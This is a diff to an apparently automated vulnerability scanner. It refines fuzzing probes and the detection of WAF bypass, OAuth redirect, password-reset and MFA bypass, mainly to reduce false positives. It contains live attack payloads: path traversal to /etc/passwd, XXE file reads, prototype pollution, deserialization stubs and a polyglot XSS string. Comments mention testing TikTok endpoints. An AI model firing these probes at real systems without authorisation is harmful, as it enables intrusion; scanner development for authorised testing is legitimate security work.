@@ -1335,34 +1335,46 @@ export class AutomationEngine {
 
         // 4d-1: Behavioral Anomaly Fuzzing — edge-case inputs that trigger parser bugs
         this.log(jobId, 'info', 'Phase 4d-1: Behavioral Anomaly Fuzzing');
+        // Markers must be probe-specific evidence — not generic English
+        // words that occur naturally in API responses, JS bundles, or HTML
+        // copy. Older versions matched 'error', 'exception', 'stack',
+        // 'overflow', 'range', 'index', 'bound', 'format', 'NaN',
+        // 'Infinity', 'alert' — each of those fired on legitimate React
+        // error pages, JSON field names, or framework copy. Each marker
+        // here should be a string we'd not expect in a clean baseline.
         const anomalyProbes: { name: string; value: string; markers: string[] }[] = [
-          { name: 'Overlong UTF-8', value: '%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd', markers: ['root:', '/bin/'] },
-          { name: 'Null byte injection', value: 'test%00.html', markers: ['error', 'exception', 'stack'] },
-          { name: 'Format string', value: '%s%s%s%s%s%s%s%s%s%s%n%n%n%n', markers: ['segfault', 'SIGSEGV', 'core dump', 'format'] },
-          { name: 'Integer overflow', value: '99999999999999999999999999999999', markers: ['overflow', 'range', 'conversion', 'NaN', 'Infinity'] },
-          { name: 'Negative index', value: '-1', markers: ['index', 'range', 'bound', 'underflow'] },
-          { name: 'Prototype pollution', value: '__proto__[isAdmin]=true', markers: ['prototype', 'isAdmin', '__proto__'] },
-          { name: 'Proto pollution JSON', value: '{"__proto__":{"isAdmin":true}}', markers: ['prototype', 'isAdmin'] },
-          { name: 'Java deserialization', value: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA', markers: ['java.io', 'ClassNotFoundException', 'ObjectInputStream', 'deserialization'] },
-          { name: 'PHP object injection', value: 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}', markers: ['unserialize', 'Object of class', '__wakeup'] },
+          { name: 'Overlong UTF-8', value: '%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd', markers: ['root:x:0:0:', 'daemon:x:', '/bin/bash', '/bin/sh', '/sbin/nologin'] },
+          { name: 'Null byte injection', value: 'test%00.html', markers: ['NUL byte', 'null byte', 'ENOENT', 'unexpected null'] },
+          { name: 'Format string', value: '%s%s%s%s%s%s%s%s%s%s%n%n%n%n', markers: ['SIGSEGV', 'segmentation fault', 'core dumped'] },
+          { name: 'Integer overflow', value: '99999999999999999999999999999999', markers: ['integer overflow', 'numeric overflow', 'out of range for int', 'value too large'] },
+          { name: 'Negative index', value: '-1', markers: ['IndexOutOfBoundsException', 'index out of range', 'array bounds', 'ArrayIndexOutOfBounds'] },
+          { name: 'Prototype pollution', value: '__proto__[isAdmin]=true', markers: ['__proto__', '"isAdmin":true'] },
+          { name: 'Proto pollution JSON', value: '{"__proto__":{"isAdmin":true}}', markers: ['__proto__', '"isAdmin":true'] },
+          { name: 'Java deserialization', value: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA', markers: ['java.io.', 'ClassNotFoundException', 'ObjectInputStream.readObject', 'java.lang.reflect'] },
+          { name: 'PHP object injection', value: 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}', markers: ['unserialize():', 'Object of class', '__wakeup', '__destruct', 'PHP Fatal'] },
           { name: 'CRLF injection', value: 'test%0d%0aInjected-Header:%20true', markers: ['Injected-Header', 'injected-header'] },
-          { name: 'Unicode normalization', value: '\u{FF0E}\u{FF0E}/\u{FF0E}\u{FF0E}/etc/passwd', markers: ['root:', '/bin/'] },
-          { name: 'Template expression', value: '${7*7}{{7*7}}<%= 7*7 %>${{7*7}}#{7*7}', markers: ['49'] },
-          { name: 'XML entity', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', markers: ['ENTITY', 'hostname', 'xxe'] },
-          { name: 'GraphQL introspection', value: '{"query":"{__schema{types{name}}}"}', markers: ['__schema', '__type', 'queryType'] },
-          { name: 'Polyglot XSS/SQLi', value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", markers: ['alert', 'oNcliCk', 'oNloAd'] },
+          { name: 'Unicode normalization', value: '\u{FF0E}\u{FF0E}/\u{FF0E}\u{FF0E}/etc/passwd', markers: ['root:x:0:0:', 'daemon:x:', '/bin/bash'] },
+          { name: 'Template expression', value: '${7*7}{{7*7}}<%= 7*7 %>${{7*7}}#{7*7}', markers: ['>49<', '"value":49', '=49&', ': 49,', ': 49}'] },
+          { name: 'XML entity', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', markers: ['root:x:0:0:', 'XML parse error', 'External entity'] },
+          { name: 'GraphQL introspection', value: '{"query":"{__schema{types{name}}}"}', markers: ['__schema', '__type', 'queryType', '"types":[{"name"'] },
+          { name: 'Polyglot XSS/SQLi', value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", markers: ['oNcliCk=alert()', 'oNloAd=alert()', '<sVg', 'jaVasCript:'] },
         ];
 
-        // Fetch baseline for anomaly comparison
-        const anomalyBaselines = new Map<string, { status: number; length: number; latency: number }>();
+        // Fetch baseline for anomaly comparison. We keep a (truncated) copy
+        // of the baseline body too, so each marker hit can be checked
+        // against the baseline — if a marker was already present in the
+        // clean response, the probe didn't induce it.
+        const anomalyBaselines = new Map<string, { status: number; length: number; latency: number; body: string }>();
         for (const ep of zerodayTargets.slice(0, 15)) {
           try {
             const start = Date.now();
             const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
+            const baseBody = (typeof res.data === 'string' ? res.data : JSON.stringify(res.data));
             anomalyBaselines.set(ep.url, {
               status: res.status,
-              length: (typeof res.data === 'string' ? res.data : JSON.stringify(res.data)).length,
+              length: baseBody.length,
               latency: Date.now() - start,
+              body: baseBody.slice(0, 200_000),
             });
           } catch {}
         }
@@ -1387,16 +1399,69 @@ export class AutomationEngine {
               const statusShift = res.status !== baseline.status;
               const sizeAnomaly = Math.abs(bodyLen - baseline.length) > baseline.length * 0.5 && bodyLen > 200;
               const latencySpike = latency > baseline.latency * 3 && latency > 2000;
-              const markerHit = probe.markers.some(m => bodyStr.toLowerCase().includes(m.toLowerCase()));
-              const errorLeak = /exception|stacktrace|traceback|fatal|panic|segfault|core dump|syntax error|unexpected token/i.test(bodyStr);
 
-              if ((statusShift && res.status >= 500) || markerHit || errorLeak || (sizeAnomaly && latencySpike)) {
+              // A marker only counts if the probe *introduced* it — it must
+              // be present now AND absent from the clean baseline. Without
+              // this check, any marker that's just part of the page (a
+              // JSON field literally named "index", an inline JS bundle
+              // shipping the word "exception" in error-handling code, the
+              // word "format" in user-facing copy) is reported as a 0day.
+              const lowerBody = bodyStr.toLowerCase();
+              const lowerBase = baseline.body.toLowerCase();
+              const newMarkers = probe.markers.filter(m => {
+                const ml = m.toLowerCase();
+                return lowerBody.includes(ml) && !lowerBase.includes(ml);
+              });
+              const markerHit = newMarkers.length > 0;
+
+              // Three layers of error-leak detection. All three require the
+              // signal to be NEW vs the clean baseline — the word 'exception'
+              // appearing in a minified JS bundle's error-handling code, or
+              // 'fatal' in user-facing copy, or even 'ORA-' in
+              // documentation, is not a leak unless the probe induced it.
+              //   1. Stack-trace shape (file:line patterns) — strongest.
+              //   2. Database error shape (Oracle/MySQL/Postgres/MS-SQL/
+              //      Mongo/Redis surface specific error prefixes/types).
+              //   3. Generic crash keywords as a fallback. Looser, but
+              //      gated by the baseline diff so we don't lose
+              //      sensitivity to single-line panics like
+              //      'FATAL: connection to ... failed'.
+              const traceShapeRe = /Traceback \(most recent call last\)|at \w[\w.$]*\([^)]*\.(?:js|ts|jsx|tsx|py|rb|php|java):\d+:\d+\)|\.(?:java|py|rb|php):\d+(?::in `|: in)|java\.lang\.[A-Z]\w*Exception:|java\.io\.[A-Z]\w*Exception:|PHP (?:Fatal|Warning|Notice|Parse) error:.{1,200}on line \d+|\sat \w[\w.$<>]*\([^)]+:\d+\)/;
+              const dbErrorShapeRe = /ORA-\d{4,5}\b|MySQL server version|ERROR \d+ \([0-9A-Z]{5}\):|SQLSTATE\[[0-9A-Z]+\]|psycopg2\.\w+Error|pg::\w+Error|MongoError:|Microsoft OLE DB Provider|System\.Data\.SqlClient\.SqlException|Unclosed quotation mark after the character string|You have an error in your SQL syntax|Warning: pg_\w+|Warning: mysql\w*_/i;
+              const genericCrashRe = /\b(?:exception|stacktrace|traceback|fatal error|kernel panic|segmentation fault|core dumped|syntax error near|unexpected token|undefined symbol|null pointer dereference|use after free)\b/i;
+
+              const probeHasTrace = traceShapeRe.test(bodyStr);
+              const probeHasDbErr = dbErrorShapeRe.test(bodyStr);
+              const probeHasGeneric = genericCrashRe.test(bodyStr);
+              const baseHasTrace = traceShapeRe.test(baseline.body);
+              const baseHasDbErr = dbErrorShapeRe.test(baseline.body);
+              const baseHasGeneric = genericCrashRe.test(baseline.body);
+
+              const errorLeak =
+                (probeHasTrace && !baseHasTrace) ||
+                (probeHasDbErr && !baseHasDbErr) ||
+                (probeHasGeneric && !baseHasGeneric);
+
+              // Server crash (status went 5xx vs a non-5xx baseline) is
+              // strong on its own. Otherwise we need at least two pieces
+              // of corroborating evidence — a NEW marker plus structural
+              // change (size, latency, or status). Marker alone is too
+              // weak: even tightened, occasional FPs slip through and
+              // the AI filter can't catch them all when LLM analysis is
+              // skipped.
+              const serverCrash = baseline.status < 500 && res.status >= 500;
+              const corroborated =
+                (markerHit && (statusShift || sizeAnomaly || latencySpike)) ||
+                errorLeak ||
+                (sizeAnomaly && latencySpike);
+
+              if (serverCrash || corroborated) {
                 const evidence: string[] = [];
                 if (statusShift) evidence.push(`Status shift: ${baseline.status} → ${res.status}`);
                 if (sizeAnomaly) evidence.push(`Size anomaly: ${baseline.length} → ${bodyLen}`);
                 if (latencySpike) evidence.push(`Latency spike: ${baseline.latency}ms → ${latency}ms`);
-                if (markerHit) evidence.push(`Marker hit: ${probe.markers.filter(m => bodyStr.toLowerCase().includes(m.toLowerCase())).join(', ')}`);
-                if (errorLeak) evidence.push(`Error leak detected in response`);
+                if (markerHit) evidence.push(`Marker hit (new vs baseline): ${newMarkers.join(', ')}`);
+                if (errorLeak) evidence.push(`Stack-trace-shaped leak (new vs baseline)`);
 
                 if (ai) {
                   const analysisPrompt = `As an elite security researcher, analyze this behavioral anomaly for potential 0day vulnerability.
@@ -2379,6 +2444,18 @@ Return JSON: {
             cleanBodyLen = cleanBody.length;
           } catch { continue; }
 
+          // If the asset returns a 3xx redirect on a harmless query, the WAF
+          // never inspects the request body — the edge redirects (e.g.
+          // tiktok.com → www.tiktok.com or http→https) before the payload
+          // reaches the WAF rule chain. Any "bypass" reported here is a
+          // false positive: clean baseline 301 == payload response 301
+          // because BOTH got redirected pre-WAF. Skip this asset and let
+          // the redirect target be tested separately.
+          if (cleanStatus >= 300 && cleanStatus < 400) {
+            this.log(jobId, 'info', `Skipping WAF bypass tests on ${asset}: clean baseline returned ${cleanStatus}, redirect happens before WAF inspection`);
+            continue;
+          }
+
           // First establish what gets blocked
           for (const bp of basePayloads) {
             try {
@@ -2575,7 +2652,31 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
                 const location = String(res.headers['location'] || '');
                 const isRedirected = res.status === 302 || res.status === 301;
 
-                if (isRedirected && location.includes(test.canary)) {
+                // A genuine open-redirect bypass means the *destination* the
+                // browser navigates to includes the canary — its hostname,
+                // path, or fragment. The canary leaking back into the query
+                // string of a same-origin redirect (e.g.
+                // Location: https://www.tiktok.com/passport/...?redirect_uri=https%3A%2F%2Fcanary)
+                // is just the server echoing input back as a query param;
+                // the browser still navigates to the original same-origin
+                // host. Without this guard every redirect_uri-aware OAuth
+                // endpoint reports CRITICAL.
+                const canaryAttacks = (() => {
+                  if (!location) return false;
+                  let parsed: URL;
+                  try {
+                    parsed = new URL(location, ep.url);
+                  } catch {
+                    return location.includes(test.canary);
+                  }
+                  return (
+                    parsed.hostname.includes(test.canary) ||
+                    parsed.pathname.includes(test.canary) ||
+                    parsed.hash.includes(test.canary)
+                  );
+                })();
+
+                if (isRedirected && canaryAttacks) {
                   this.log(jobId, 'vuln', `OAUTH REDIRECT BYPASS [${test.name}]: ${ep.url}`, {
                     redirect_to: location, test: test.name,
                   });
@@ -2622,9 +2723,23 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
 
         // 4h-2: Password reset flow abuse
         this.log(jobId, 'info', 'Phase 4h-2: Password reset flow analysis');
-        const resetEndpoints = endpoints.filter((ep: { url: string }) =>
-          /reset|forgot|recover|password|restore/i.test(ep.url)
-        );
+        // Same FP class as 4h-3: a flat substring match on "reset" /
+        // "recover" / "restore" / "password" hits unrelated endpoints
+        // (session-restore APIs, password-policy help pages, recovery
+        // email form pages that aren't the actual reset endpoint).
+        // Require a path-segment shape: either an explicit reset-flow term
+        // as a complete path component, or a recover/forgot/reset/restore
+        // segment reached *through* an auth-context segment.
+        const resetPathRe = /(?:^|\/)(?:password[-_]?reset|reset[-_]?password|forgot[-_]?password|password[-_]?recover|reset[-_]?token)(?:\/|$|\?)|\/(?:auth|account|users?|passport|login|signin|sso)\/[^?]*?(?:reset|recover|forgot|restore)\b/i;
+        const resetEndpoints = endpoints.filter((ep: { url: string }) => {
+          let path: string;
+          try {
+            path = new URL(ep.url).pathname;
+          } catch {
+            return false;
+          }
+          return resetPathRe.test(path);
+        });
 
         for (const ep of resetEndpoints.slice(0, 5)) {
           if (authCount >= 12) break;
@@ -2698,9 +2813,26 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
 
         // 4h-3: MFA bypass detection
         this.log(jobId, 'info', 'Phase 4h-3: MFA bypass detection');
-        const mfaEndpoints = endpoints.filter((ep: { url: string }) =>
-          /mfa|2fa|two.?factor|otp|verify|challenge|totp|authenticator/i.test(ep.url)
-        );
+        // Tightened from a flat substring match against words like "verify"
+        // and "challenge", which fired on TikTok's hashtag-challenge feature
+        // (`/api/challenge/item_list/`, `/@dailychallenge0`) and any feature
+        // page whose path contained "verify". Now we either match an
+        // unambiguous MFA term as its own path segment (mfa, 2fa, otp,
+        // totp, authenticator, two-factor) OR we require a verify/challenge
+        // segment to be reached *through* an auth-context segment
+        // (/auth/verify, /passport/2fa, /sso/challenge, /account/verify, …).
+        // Public content endpoints that happen to contain "challenge" no
+        // longer trigger MFA-class probes.
+        const mfaPathRe = /(?:^|\/)(?:mfa|2fa|two[-_.]?factor|otp|totp|authenticator)(?:\/|$|\?)|\/(?:auth|login|signin|sign[-_]in|passport|account|users?|sso|email|phone)\/[^?]*?(?:verify|challenge|confirm)\b/i;
+        const mfaEndpoints = endpoints.filter((ep: { url: string }) => {
+          let path: string;
+          try {
+            path = new URL(ep.url).pathname;
+          } catch {
+            return false;
+          }
+          return mfaPathRe.test(path);
+        });
 
         for (const ep of mfaEndpoints.slice(0, 5)) {
           if (authCount >= 12) break;
